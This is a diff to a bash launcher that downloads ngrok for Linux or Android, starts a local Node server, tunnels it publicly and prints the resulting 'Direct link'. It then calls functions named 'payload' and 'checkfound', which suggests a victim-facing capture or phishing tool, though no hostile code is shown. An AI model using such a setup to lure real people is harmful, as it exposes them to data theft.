@@ -97,13 +97,29 @@ else
   arch=$(uname -a | grep -o 'arm' | head -n1)
   arch2=$(uname -a | grep -o 'Android' | head -n1)
   arch3=$(uname -a | grep -o 'Linux' | head -n1)
-  if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] || [[ $arch3 == *'Linux'* ]] ; then
+
+  # linux ngrok file download
+  if [[ $arch == *'arm'* ]] || [[ $arch3 == *'Linux'* ]] ; then
     printf "${green}Downloading Ngrok.........${default}\n"
     wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
     if [[ -e ngrok-stable-linux-386.zip ]]; then
       unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
       chmod +x ngrok > /dev/null 2>&1
       rm -rf ngrok-stable-linux-386.zip
+    fi
+  else
+    printf "${red}Download Error${default} \n"
+    exit 1
+  fi
+
+  # android ngrok download file
+  if [[ $arch2 == *'Android'* ]]; then
+    printf "${green}Downloading Ngrok.........${default}\n"
+    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1 
+    if [[ -e ngrok-stable-linux-arm.zip ]]; then
+      unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
+      chmod +x ngrok > /dev/null 2>&1
+      rm -rf ngrok-stable-linux-arm.zip
     fi
   else
     printf "${red}Download Error${default} \n"
@@ -134,14 +150,18 @@ else
 fi
 node src/server.js > /dev/null 2>&1 &
 sleep 2
-printf "${red} please open hotspot other wise you not get link${default} \n"
+printf "${red}if you aur using Android  please turn on hotspot other wise you not get link${default} \n\n\n"
 ./ngrok http 3000 > /dev/null 2>&1 &
 sleep 10
 link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9A-Za-z.-]*\.ngrok.io");
 if [[ $link ]]; then
   printf "${green} Direct link :${white} ${link} ${default}\n"
 else
-  printf "${red}Direct link not genrate"
+  printf "${red} Direct link not genrate check following possible reason ${default}\n"
+  printf "${blue} Ngrok authtoken is not valid ${default}\n"
+  printf "If you are using Android turn on hotspot ${default}\n"
+  printf "Ngrok is already running run this cammand killall ngrok${default}\n"
+  printf "Check your internet connection${default}\n"
 fi
 payload
 checkfound
